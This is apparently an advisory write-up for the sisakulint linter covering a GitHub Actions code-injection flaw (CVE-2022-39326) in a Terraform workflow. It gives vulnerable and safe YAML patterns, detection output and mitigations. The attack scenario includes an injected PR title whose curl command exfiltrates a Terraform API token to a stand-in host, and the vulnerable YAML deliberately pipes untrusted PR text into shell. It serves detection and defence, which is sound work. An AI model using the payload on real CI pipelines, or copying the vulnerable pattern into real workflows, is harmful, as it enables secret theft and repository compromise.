# GHSA-f9qj-7gh3-mhj4: RCE via Terraform Plan with PR Input in kartverket/github-workflows

## Summary

| Field | Value |
|-------|-------|
| **Advisory ID** | GHSA-f9qj-7gh3-mhj4 |
| **Package** | kartverket/github-workflows |
| **Severity** | High (CVSS 8.8) |
| **Vulnerability Type** | Code Injection (CWE-94) |
| **CVE** | CVE-2022-39326 |
| **Affected Versions** | < v2.7.5 |
| **Fixed Version** | v2.7.5 |
| **Published** | 2022-10-19 |
| **Advisory URL** | https://github.com/advisories/GHSA-f9qj-7gh3-mhj4 |

## Vulnerability Description

The `kartverket/github-workflows` repository's `run-terraform` reusable workflow is vulnerable to arbitrary JavaScript code execution. A malicious actor can send a pull request with a crafted payload that leads to code injection during the `terraform plan` operation.

**Technical Root Cause:** The vulnerability occurs in how Terraform plan output is processed and posted as PR comments. The workflow fails to sanitize JavaScript template string symbols (`${}`) from Terraform output before displaying it in GitHub Actions. When this output is used in workflow contexts, these template literals can be interpreted as executable code rather than plain text.

Additionally, the workflow may use pull request metadata (title, body) directly in Terraform commands or shell scripts without proper sanitization. The affected workflows use the `pull_request_target` trigger, which provides:
- Write access to the repository
- Access to repository secrets
- Execution in the context of the base branch

**Attack Vectors:**
1. Malicious Terraform plan output containing `${}` template strings
2. PR metadata (title/body) used directly in shell variable assignments or Terraform variables
3. Untrusted input passed to command-line parameters without environment variable isolation

### Attack Scenario

1. Attacker opens a pull request with malicious title: ``Fix bug"; curl http://evil.com/steal?token=$TF_API_TOKEN #``
2. The `pull_request_target` workflow triggers
3. PR title is used in Terraform command: `terraform plan -var="comment=$PR_TITLE"`
4. The shell interprets the double-quote and semicolon
5. Injected `curl` command executes with access to Terraform secrets
6. API tokens, cloud credentials, or other secrets are exfiltrated

## Vulnerable Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  terraform-plan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3

      - name: Terraform Plan
        run: |
          # Vulnerable: PR title/body used directly in command
          PR_TITLE="${{ github.event.pull_request.title }}"
          PR_BODY="${{ github.event.pull_request.body }}"

          # Command injection via -var parameter
          terraform plan -var="comment=$PR_TITLE" -out=tfplan

          echo "Planning changes for: $PR_TITLE"

      - name: Comment on PR
        run: |
          # Vulnerable: PR content used in output
          PLAN_OUTPUT=$(terraform show -no-color tfplan)
          COMMENT="## Terraform Plan\n\nPR: ${{ github.event.pull_request.title }}\n\n$PLAN_OUTPUT"
          echo "$COMMENT"
```

### Why This is Vulnerable

- PR title and body are attacker-controlled
- Direct substitution allows shell metacharacter injection
- Terraform variables can contain command substitution syntax
- `pull_request_target` provides access to sensitive secrets
- No validation or sanitization of PR metadata

## Safe Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  terraform-plan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3

      - name: Terraform Plan
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          # Safe: Use environment variables
          # Avoid using PR content in terraform commands
          terraform plan -out=tfplan

          echo "Planning changes for PR"

      - name: Comment on PR
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          # Safe: Use environment variable
          PLAN_OUTPUT=$(terraform show -no-color tfplan)

          echo "## Terraform Plan"
          echo ""
          echo "PR Title: $PR_TITLE"
          echo ""
          echo "$PLAN_OUTPUT"
```

### Why This is Safe

- Environment variables prevent command injection
- PR content is not passed to Terraform commands as variables
- GitHub Actions runtime handles escaping
- Separation of untrusted data from command parameters
- Output is generated without incorporating raw PR content

## Detection in sisakulint

### Expected Rules

- **CodeInjectionCriticalRule** - Should detect usage of `github.event.pull_request.title`, `github.event.pull_request.body` in shell commands
- **ArgumentInjectionCriticalRule** - Should detect untrusted input passed as command arguments

### Detection Result

```
script/actions/advisory/GHSA-f9qj-7gh3-mhj4-vulnerable.yaml:23:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 10). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
script/actions/advisory/GHSA-f9qj-7gh3-mhj4-vulnerable.yaml:32:24: code injection (critical): "github.event.pull_request.title" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-f9qj-7gh3-mhj4-vulnerable.yaml:33:23: code injection (critical): "github.event.pull_request.body" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-f9qj-7gh3-mhj4-vulnerable.yaml:45:48: code injection (critical): "github.event.pull_request.title" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | CodeInjectionCriticalRule | Yes |
| Yes | UntrustedCheckoutRule | Yes |

sisakulint successfully detected all code injection vulnerabilities:
- Line 32: Direct usage of `github.event.pull_request.title` in shell variable assignment
- Line 33: Direct usage of `github.event.pull_request.body` in shell variable assignment
- Line 45: Direct usage of `github.event.pull_request.title` in string concatenation
- Line 23: Untrusted checkout with `pull_request_target` trigger

The detection correctly identifies these as **critical** vulnerabilities because they occur in a workflow with `pull_request_target` trigger, which grants elevated privileges and access to secrets.

Test files:
- Vulnerable: `/Users/atsushi.sada/go/src/github.com/sisaku-security/sisakulint/script/actions/advisory/GHSA-f9qj-7gh3-mhj4-vulnerable.yaml`
- Safe: `/Users/atsushi.sada/go/src/github.com/sisaku-security/sisakulint/script/actions/advisory/GHSA-f9qj-7gh3-mhj4-safe.yaml`

### Verification Command

```bash
sisakulint script/actions/advisory/GHSA-f9qj-7gh3-mhj4-vulnerable.yaml
sisakulint script/actions/advisory/GHSA-f9qj-7gh3-mhj4-safe.yaml
```

## Mitigation Strategies

1. **Use Environment Variables** (Critical)
   - Always pass PR metadata through environment variables
   - Never use PR title/body directly in command arguments

2. **Avoid Using PR Content in Commands**
   - Don't pass PR metadata to Terraform variables
   - Don't use PR content in command-line parameters
   - Use PR number or SHA for identification instead

3. **Input Validation**
   - Validate PR title/body format
   - Reject PRs with suspicious characters
   - Use allowlists for acceptable characters

4. **Separate Workflows**
   - Use untrusted `pull_request` workflow for validation
   - Use trusted workflow only for post-merge operations
   - Pass minimal data between workflows

5. **Terraform-Specific Mitigations**
   - Use `.tfvars` files instead of command-line variables
   - Validate all variables in Terraform code
   - Use `terraform validate` before `plan`

6. **Least Privilege**
   - Minimize secrets available to PR workflows
   - Use read-only tokens when possible
   - Implement secret scanning on outputs

## Additional Context

This vulnerability pattern is common in Infrastructure-as-Code (IaC) workflows where:
- Terraform/CloudFormation commands accept variables
- PR metadata is used for audit trails or comments
- Workflows need to post results back to PRs

The vulnerability extends beyond Terraform to any IaC tool that accepts command-line parameters derived from untrusted input.

## References

### GitHub Links
- GitHub Advisory: https://github.com/advisories/GHSA-f9qj-7gh3-mhj4
- Repository: https://github.com/kartverket/github-workflows
- Repository Security Advisory: https://github.com/kartverket/github-workflows/security/advisories/GHSA-f9qj-7gh3-mhj4
- Patch Pull Request: https://github.com/kartverket/github-workflows/pull/19
- Release: https://github.com/kartverket/github-workflows/releases/tag/v2.7.5

### External References
- CVE-2022-39326: https://nvd.nist.gov/vuln/detail/CVE-2022-39326
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- GitHub Actions: Deprecated set-output command migration

### Related sisakulint Rules
- [Code Injection Rule](../codeinjectionrule.md)
- [Argument Injection Rule](../argumentinjection.md)
